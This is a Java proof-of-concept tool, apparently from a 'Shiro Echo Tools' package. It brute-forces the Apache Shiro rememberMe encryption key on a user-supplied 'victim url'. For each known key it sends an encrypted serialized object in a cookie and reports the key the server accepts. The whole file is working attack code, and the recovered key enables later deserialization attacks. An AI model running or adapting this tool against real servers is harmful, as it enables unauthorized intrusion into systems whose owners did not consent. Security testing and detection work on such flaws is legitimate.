package org.unicodesec;


import org.apache.http.Header;
import org.apache.http.HttpHeaders;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.shiro.subject.SimplePrincipalCollection;
import yso.payloads.Strings;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.LinkedList;
import java.util.List;

public class poc {
    public static void main(String[] args) throws Exception {
        String text = "   _____   _       _                  ______          _               _______                   _       \n" +
                "  / ____| | |     (_)                |  ____|        | |             |__   __|                 | |      \n" +
                " | (___   | |__    _   _ __    ___   | |__      ___  | |__     ___      | |      ___     ___   | |  ___ \n" +
                "  \\___ \\  | '_ \\  | | | '__|  / _ \\  |  __|    / __| | '_ \\   / _ \\     | |     / _ \\   / _ \\  | | / __|\n" +
                "  ____) | | | | | | | | |    | (_) | | |____  | (__  | | | | | (_) |    | |    | (_) | | (_) | | | \\__ \\\n" +
                " |_____/  |_| |_| |_| |_|     \\___/  |______|  \\___| |_| |_|  \\___/     |_|     \\___/   \\___/  |_| |___/\n" +
                "                                                                                                        \n" +
                "                                                                  Powered by UnicodeSec                 \n" +
                "                                                                  Version  0.0.2                        ";
        System.out.println(text);
        if (args.length == 0) {
            System.out.println("java -cp shiroPoc-[version]-all.jar org.unicodesec.poc [victim url]");
            System.out.println("eg:");
            System.out.println("    " + "java -cp shiroPoc-[version]-all.jar org.unicodesec.poc http://127.0.0.1:8080/shiro\n");
            System.err.println("  Available shiro key:");

            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[]{"index", "key"});
            rows.add(new String[]{"---------------", "---------------"});
            for (int i = 0; i < keys.keys.length; i++) {
                rows.add(new String[]{
                        String.valueOf(i),
                        keys.keys[i],
                });
            }

            final List<String> lines = Strings.formatTable(rows);
            for (String line : lines) {
                System.err.println("     " + line);
            }
            return;
        }

        String victimUrl = args[0];
        CloseableHttpClient httpclient = HttpClients.createDefault();
        for (int i = 0; i < keys.keys.length; i++) {
            byte[] bytes = MakeGadget();
            String rememberMe = EncryptUtil.shiroEncrypt(keys.keys[i], bytes);
            HttpGet request = new HttpGet(victimUrl);
            request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
            request.setHeader("Cookie", "rememberMe=" + rememberMe);
            CloseableHttpResponse response = httpclient.execute(request);
            boolean isDeleteMe = false;
            for (Header h : response.getAllHeaders()) {
                if (h.getName().toLowerCase().contains("set-cookie")) {
                    if (h.getValue().contains("rememberMe=deleteMe")) {
                        isDeleteMe = true;
                    }
                }
            }
            if (isDeleteMe == false) {
                System.out.println(String.format("found Shiro Vulnerability, Shiro key %s", keys.keys[i]));
                return;
            }
            response.close();
        }

        System.out.println(String.format("not found Shiro Vulnerability,"));


    }

    private static byte[] MakeGadget() throws Exception {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        return getBytes(simplePrincipalCollection);
    }

    private static byte[] getBytes(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream;
        ObjectOutputStream objectOutputStream;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

}

